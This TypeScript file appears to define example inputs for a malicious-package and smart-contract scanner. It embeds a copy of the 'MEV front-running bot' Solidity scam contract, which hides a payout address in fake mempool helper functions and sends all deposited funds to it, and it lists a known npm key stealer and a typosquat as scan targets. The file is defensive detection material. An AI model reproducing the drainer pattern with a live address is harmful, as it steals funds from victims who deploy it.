/** Mirrors packages/core/test/fixtures/sol/FrontRunBot.sol: an inert copy of the "MEV bot" drainer template. */
export const SAMPLE_DRAINER = `// SPDX-License-Identifier: MIT
// Sample of the "mempool front-running bot" scam template (payout address is inert).
pragma solidity ^0.8.20;

contract FrontRunBot {
    event Log(string _msg);

    receive() external payable {}

    function getMemPoolOffset() internal pure returns (string memory) { return "bad0bad0"; }
    function getMemPoolDepth() internal pure returns (string memory) { return "bad00000"; }
    function getMemPoolLength() internal pure returns (string memory) { return "00000000"; }
    function getMemPoolHeight() internal pure returns (string memory) { return "00000000"; }
    function checkLiquidity() internal pure returns (string memory) { return "b0700b07"; }

    function callMempool() internal pure returns (string memory) {
        return string(abi.encodePacked("0x", getMemPoolOffset(), getMemPoolDepth(), getMemPoolLength(), getMemPoolHeight(), checkLiquidity()));
    }

    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) { b1 -= 87; } else if ((b1 >= 48) && (b1 <= 57)) { b1 -= 48; }
            if ((b2 >= 97) && (b2 <= 102)) { b2 -= 87; } else if ((b2 >= 48) && (b2 <= 57)) { b2 -= 48; }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function start() public payable {
        emit Log("Running FrontRun attack on Uniswap. This can take a while please wait...");
        payable(parseMemoryPool(callMempool())).transfer(address(this).balance);
    }

    function withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(parseMemoryPool(callMempool())).transfer(address(this).balance);
    }
}
`;

export type Mode = "auto" | "github" | "npm" | "pypi" | "solidity";

export const EXAMPLES: { label: string; hint: string; input: string; mode: Mode }[] = [
  { label: "polymarket-claude-code", hint: "npm · 2026 key stealer", input: "npm:polymarket-claude-code", mode: "npm" },
  { label: "Sample MEV-bot contract", hint: "Solidity · drainer", input: SAMPLE_DRAINER, mode: "solidity" },
  { label: "Polymarket/py-sdk", hint: "GitHub · official SDK", input: "github.com/Polymarket/py-sdk", mode: "github" },
  { label: "axois", hint: "npm · typosquat", input: "npm:axois", mode: "npm" },
];
